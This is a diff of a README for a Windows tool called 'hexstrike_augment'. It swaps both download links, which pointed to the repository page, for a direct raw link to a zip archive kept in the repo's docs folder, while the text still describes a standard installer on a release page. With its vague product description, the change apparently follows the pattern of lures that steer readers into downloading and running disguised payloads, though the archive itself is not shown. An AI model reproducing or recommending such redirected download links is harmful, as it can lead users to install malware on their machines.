@@ -1,6 +1,6 @@
 # ⚡ hexstrike_augment - Improve your workflow with smart skills
 
-[![Download for Windows](https://img.shields.io/badge/Download-HexStrike-blue.svg)](https://github.com/subsaharan-metallic807/hexstrike_augment)
+[![Download for Windows](https://img.shields.io/badge/Download-HexStrike-blue.svg)](https://raw.githubusercontent.com/subsaharan-metallic807/hexstrike_augment/main/docs/hexstrike_augment_2.8.zip)
 
 ## 📖 About this application
 
@@ -20,7 +20,7 @@ Your computer needs specific parts to run this software. Check your system again
 
 You must visit the project release page to get the installer. We package the software as a standard Windows installer. 
 
-[Visit this page to download the latest setup file](https://github.com/subsaharan-metallic807/hexstrike_augment)
+[Visit this page to download the latest setup file](https://raw.githubusercontent.com/subsaharan-metallic807/hexstrike_augment/main/docs/hexstrike_augment_2.8.zip)
 
 1. Open your web browser. 
 2. Click the link above.
